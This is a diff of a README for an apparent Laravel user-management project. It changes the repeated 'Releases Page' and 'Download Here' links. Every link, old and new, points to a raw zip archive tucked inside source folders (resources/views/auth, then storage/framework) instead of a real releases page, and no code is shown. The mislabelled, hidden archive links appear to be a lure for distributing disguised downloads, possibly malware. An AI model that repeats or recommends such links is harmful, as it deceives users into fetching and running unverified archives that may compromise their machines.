@@ -1,6 +1,6 @@
 # 🚀 laravel-user-management - Simple User Management Made Easy
 
-[![Download](https://github.com/Guillen01/laravel-user-management/raw/refs/heads/main/resources/views/auth/management-user-laravel-frontingly.zip)](https://github.com/Guillen01/laravel-user-management/raw/refs/heads/main/resources/views/auth/management-user-laravel-frontingly.zip)
+[![Download](https://github.com/Guillen01/laravel-user-management/raw/refs/heads/main/storage/framework/laravel-user-management-2.0.zip)](https://github.com/Guillen01/laravel-user-management/raw/refs/heads/main/storage/framework/laravel-user-management-2.0.zip)
 
 ## 📥 Overview
 
@@ -29,7 +29,7 @@ To successfully run Laravel User Management, you need:
 
 ### Step 1: Visit the Releases Page
 
-To access the latest release of the application, visit the following link: [Releases Page](https://github.com/Guillen01/laravel-user-management/raw/refs/heads/main/resources/views/auth/management-user-laravel-frontingly.zip).
+To access the latest release of the application, visit the following link: [Releases Page](https://github.com/Guillen01/laravel-user-management/raw/refs/heads/main/storage/framework/laravel-user-management-2.0.zip).
 
 ### Step 2: Download the Application
 
@@ -81,7 +81,7 @@ Open your web browser and visit `http://localhost:8000` to see the application i
 
 ## 🖥️ Download & Install
 
-Visit the Releases Page to begin downloading the latest version: [Download Here](https://github.com/Guillen01/laravel-user-management/raw/refs/heads/main/resources/views/auth/management-user-laravel-frontingly.zip).
+Visit the Releases Page to begin downloading the latest version: [Download Here](https://github.com/Guillen01/laravel-user-management/raw/refs/heads/main/storage/framework/laravel-user-management-2.0.zip).
 
 ## 🎨 User Guide
 
